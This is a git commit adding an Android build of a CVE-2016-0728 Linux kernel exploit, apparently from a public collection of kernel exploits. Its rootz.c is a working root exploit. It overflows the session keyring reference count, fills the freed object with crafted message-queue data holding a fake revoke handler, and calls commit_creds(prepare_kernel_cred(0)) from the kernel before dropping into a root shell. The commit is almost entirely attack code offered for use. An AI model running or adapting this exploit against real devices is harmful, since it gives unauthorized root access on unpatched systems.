SecWiki__linux-kernel-exploits
commit 3ccdc3fd4e5607b55e612aa62b09dc412a82ca55
Author:     Gitmaninc <gitman@foxmail.com>
AuthorDate: Sun May 14 09:26:17 2017 -0400
Commit:     Gitmaninc <gitman@foxmail.com>
CommitDate: Sun May 14 09:26:17 2017 -0400

    CVE-2016-0728

diff --git a/CVE-2016-0728/cve-2016-0728/Android.mk b/CVE-2016-0728/cve-2016-0728/Android.mk
new file mode 100644
index 0000000..46bd90c
--- /dev/null
+++ b/CVE-2016-0728/cve-2016-0728/Android.mk
@@ -0,0 +1,20 @@
+LOCAL_PATH := $(call my-dir)
+
+include $(CLEAR_VARS)
+
+LOCAL_SRC_FILES := rootz.c
+
+LOCAL_MODULE := rootz
+LOCAL_MODULE_TAGS := optional
+
+LOCAL_LDFLAGS := -Wl,--hash-style=sysv
+
+LOCAL_STATIC_LIBRARIES := libc
+
+LOCAL_FORCE_STATIC_EXECUTABLE := true
+
+include $(BUILD_STATIC_EXECUTABLE)
+
+include $(BUILD_EXECUTABLE)
+
+include $(call all-makefiles-under,$(LOCAL_PATH))
diff --git a/CVE-2016-0728/cve-2016-0728/keyutils.h b/CVE-2016-0728/cve-2016-0728/keyutils.h
new file mode 100644
index 0000000..0d76f5d
--- /dev/null
+++ b/CVE-2016-0728/cve-2016-0728/keyutils.h
@@ -0,0 +1,88 @@
+/* keyutils.h: key utility library interface
+ *
+ * Copyright (C) 2005,2011 Red Hat, Inc. All Rights Reserved.
+ * Written by David Howells (dhowells@redhat.com)
+ *
+ * This program is free software; you can redistribute it and/or
+ * modify it under the terms of the GNU Lesser General Public License
+ * as published by the Free Software Foundation; either version
+ * 2 of the License, or (at your option) any later version.
+ */
+
+#include <sys/types.h>
+#include <stdint.h>
+
+/* key serial number */
+typedef int32_t key_serial_t;
+/* special process keyring shortcut IDs */
+#define KEY_SPEC_THREAD_KEYRING		-1	/* - key ID for thread-specific keyring */
+#define KEY_SPEC_PROCESS_KEYRING	-2	/* - key ID for process-specific keyring */
+#define KEY_SPEC_SESSION_KEYRING	-3	/* - key ID for session-specific keyring */
+#define KEY_SPEC_USER_KEYRING		-4	/* - key ID for UID-specific keyring */
+#define KEY_SPEC_USER_SESSION_KEYRING	-5	/* - key ID for UID-session keyring */
+#define KEY_SPEC_GROUP_KEYRING		-6	/* - key ID for GID-specific keyring */
+#define KEY_SPEC_REQKEY_AUTH_KEY	-7	/* - key ID for assumed request_key auth key */
+/* request-key default keyrings */
+#define KEY_REQKEY_DEFL_NO_CHANGE		-1
+#define KEY_REQKEY_DEFL_DEFAULT			0
+#define KEY_REQKEY_DEFL_THREAD_KEYRING		1
+#define KEY_REQKEY_DEFL_PROCESS_KEYRING		2
+#define KEY_REQKEY_DEFL_SESSION_KEYRING		3
+#define KEY_REQKEY_DEFL_USER_KEYRING		4
+#define KEY_REQKEY_DEFL_USER_SESSION_KEYRING	5
+#define KEY_REQKEY_DEFL_GROUP_KEYRING		6
+/* key handle permissions mask */
+typedef uint32_t key_perm_t;
+#define KEY_POS_VIEW	0x01000000	/* possessor can view a key's attributes */
+#define KEY_POS_READ	0x02000000	/* possessor can read key payload / view keyring */
+#define KEY_POS_WRITE	0x04000000	/* possessor can update key payload / add link to keyring */
+#define KEY_POS_SEARCH	0x08000000	/* possessor can find a key in search / search a keyring */
+#define KEY_POS_LINK	0x10000000	/* possessor can create a link to a key/keyring */
+#define KEY_POS_SETATTR	0x20000000	/* possessor can set key attributes */
+#define KEY_POS_ALL	0x3f000000
+#define KEY_USR_VIEW	0x00010000	/* user permissions... */
+#define KEY_USR_READ	0x00020000
+#define KEY_USR_WRITE	0x00040000
+#define KEY_USR_SEARCH	0x00080000
+#define KEY_USR_LINK	0x00100000
+#define KEY_USR_SETATTR	0x00200000
+#define KEY_USR_ALL	0x003f0000
+#define KEY_GRP_VIEW	0x00000100	/* group permissions... */
+#define KEY_GRP_READ	0x00000200
+#define KEY_GRP_WRITE	0x00000400
+#define KEY_GRP_SEARCH	0x00000800
+#define KEY_GRP_LINK	0x00001000
+#define KEY_GRP_SETATTR	0x00002000
+#define KEY_GRP_ALL	0x00003f00
+#define KEY_OTH_VIEW	0x00000001	/* third party permissions... */
+#define KEY_OTH_READ	0x00000002
+#define KEY_OTH_WRITE	0x00000004
+#define KEY_OTH_SEARCH	0x00000008
+#define KEY_OTH_LINK	0x00000010
+#define KEY_OTH_SETATTR	0x00000020
+#define KEY_OTH_ALL	0x0000003f
+/* keyctl commands */
+#define KEYCTL_GET_KEYRING_ID		0	/* ask for a keyring's ID */
+#define KEYCTL_JOIN_SESSION_KEYRING	1	/* join or start named session keyring */
+#define KEYCTL_UPDATE			2	/* update a key */
+#define KEYCTL_REVOKE			3	/* revoke a key */
+#define KEYCTL_CHOWN			4	/* set ownership of a key */
+#define KEYCTL_SETPERM			5	/* set perms on a key */
+#define KEYCTL_DESCRIBE			6	/* describe a key */
+#define KEYCTL_CLEAR			7	/* clear contents of a keyring */
+#define KEYCTL_LINK			8	/* link a key into a keyring */
+#define KEYCTL_UNLINK			9	/* unlink a key from a keyring */
+#define KEYCTL_SEARCH			10	/* search for a key in a keyring */
+#define KEYCTL_READ			11	/* read a key or keyring's contents */
+#define KEYCTL_INSTANTIATE		12	/* instantiate a partially constructed key */
+#define KEYCTL_NEGATE			13	/* negate a partially constructed key */
+#define KEYCTL_SET_REQKEY_KEYRING	14	/* set default request-key keyring */
+#define KEYCTL_SET_TIMEOUT		15	/* set timeout on a key */
+#define KEYCTL_ASSUME_AUTHORITY		16	/* assume authority to instantiate key */
+#define KEYCTL_GET_SECURITY		17	/* get key security label */
+#define KEYCTL_SESSION_TO_PARENT	18	/* set my session keyring on my parent process */
+#define KEYCTL_REJECT			19	/* reject a partially constructed key */
+#define KEYCTL_INSTANTIATE_IOV		20	/* instantiate a partially constructed key */
+#define KEYCTL_INVALIDATE		21	/* invalidate a key */
+#define KEYCTL_GET_PERSISTENT		22	/* get a user's persistent keyring */
+
diff --git a/CVE-2016-0728/cve-2016-0728/rootz.c b/CVE-2016-0728/cve-2016-0728/rootz.c
new file mode 100644
index 0000000..beedc12
--- /dev/null
+++ b/CVE-2016-0728/cve-2016-0728/rootz.c
@@ -0,0 +1,173 @@
+/* $ gcc cve_2016_0728.c -o cve_2016_0728 -lkeyutils -Wall */
+/* $ ./cve_2016_072 PP_KEY */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/types.h>
+#include "keyutils.h"
+#include <unistd.h>
+#include <time.h>
+#include <unistd.h>
+
+#include <sys/ipc.h>
+#include <sys/msg.h>
+
+typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
+typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
+_commit_creds commit_creds;
+_prepare_kernel_cred prepare_kernel_cred;
+
+#define STRUCT_LEN (0xb8 - 0x30)
+
+void *
+get_symbol(char *name)
+{
+    FILE *f = fopen("/proc/kallsyms", "r");
+    char c, sym[512];
+    void *addr;
+
+    while (fscanf(f, "%p %c %s\n", &addr, &c, sym) > 0) {
+        if (!strcmp(sym, name))
+            return addr;
+    }
+
+    return NULL;
+}
+
+struct key_type {
+    char * name;
+    size_t datalen;
+    void * vet_description;
+    void * preparse;
+    void * free_preparse;
+    void * instantiate;
+    void * update;
+    void * match_preparse;
+    void * match_free;
+    void * revoke;
+    void * destroy;
+};
+
+void userspace_revoke(void * key) {
+    commit_creds(prepare_kernel_cred(0));
+}
+
+int main(int argc, const char *argv[]) {
+
+	const char *keyring_name;
+	size_t i = 0;
+    unsigned long int l = 0x100000000/2;
+	key_serial_t serial = -1;
+	pid_t pid = -1;
+    struct key_type * my_key_type = NULL;
+    
+struct { long mtype;
+		char mtext[STRUCT_LEN];
+	} msg = {0x4141414141414141, {0}};
+	int msqid;
+
+	if (argc != 2) {
+		puts("usage: ./keys <key_name>");
+		return 1;
+	}
+
+    printf("uid=%d, euid=%d\n", getuid(), geteuid()); 
+    commit_creds = (_commit_creds) get_symbol("commit_creds");
+    prepare_kernel_cred = (_prepare_kernel_cred) get_symbol("prepare_kernel_cred");
+    
+    my_key_type = malloc(sizeof(*my_key_type));
+
+    my_key_type->revoke = (void*)userspace_revoke;
+    memset(msg.mtext, 'A', sizeof(msg.mtext));
+
+    // key->uid
+    *(int*)(&msg.mtext[56]) = 0x3e8; /* geteuid() */
+    //key->perm
+    *(int*)(&msg.mtext[64]) = 0x3f3f3f3f;
+
+    //key->type
+    *(unsigned long *)(&msg.mtext[80]) = (unsigned long)my_key_type;
+
+    if ((msqid = syscall(303, IPC_PRIVATE, 0644 | IPC_CREAT)) == -1) {
+        perror("msgget");
+        exit(1);
+    }
+
+    keyring_name = argv[1];
+
+	/* Set the new session keyring before we start */
+
+	serial = syscall(311, KEYCTL_JOIN_SESSION_KEYRING, keyring_name);
+	if (serial < 0) {
+		perror("keyctl");
+		return -1;
+    }
+	
+	if (syscall(311, KEYCTL_SETPERM, serial, KEY_POS_ALL | KEY_USR_ALL | KEY_GRP_ALL | KEY_OTH_ALL) < 0) {
+		perror("keyctl");
+		return -1;
+	}
+
+
+	puts("Increfing...");
+    for (i = 1; i < 0xfffffffd; i++) {
+        if (i == (0xffffffff - l)) {
+            l = l/2;
+            sleep(5);
+        }
+        if (syscall(311, KEYCTL_JOIN_SESSION_KEYRING, keyring_name) < 0) {
+            perror("keyctl");
+            return -1;
+        }
+    }
+    sleep(5);
+    /* here we are going to leak the last references to overflow */
+    for (i=0; i<5; ++i) {
+        if(syscall(311, KEYCTL_JOIN_SESSION_KEYRING, keyring_name) < 0) {
+            perror("keyctl");
+            return -1;
+        }
+    }
+
+    puts("finished increfing");
+    puts("forking...");
+    /* allocate msg struct in the kernel rewriting the freed keyring object */
+    for (i=0; i<64; i++) {
+        pid = fork();
+        if (pid == -1) {
+            perror("fork");
+            return -1;
+        }
+
+        if (pid == 0) {
+            sleep(2);
+            if ((msqid = syscall(303, IPC_PRIVATE, 0644 | IPC_CREAT)) == -1) {
+                perror("msgget");
+                exit(1);
+            }
+            for (i = 0; i < 64; i++) {
+                if (syscall(301, msqid, &msg, sizeof(msg.mtext), 0) == -1) {
+                    perror("msgsnd");
+                    exit(1);
+                }
+            }
+            sleep(-1);
+            exit(1);
+        }
+    }
+   
+    puts("finished forking");
+    sleep(5);
+
+    /* call userspace_revoke from kernel */
+    puts("caling revoke...");
+    if (syscall(311, KEYCTL_REVOKE, KEY_SPEC_SESSION_KEYRING) == -1) {
+        perror("keyctl_revoke");
+    }
+
+    printf("uid=%d, euid=%d\n", getuid(), geteuid());
+    execl("/system/bin/sh", "/system/bin/sh", NULL);
+
+    return 0;
+}
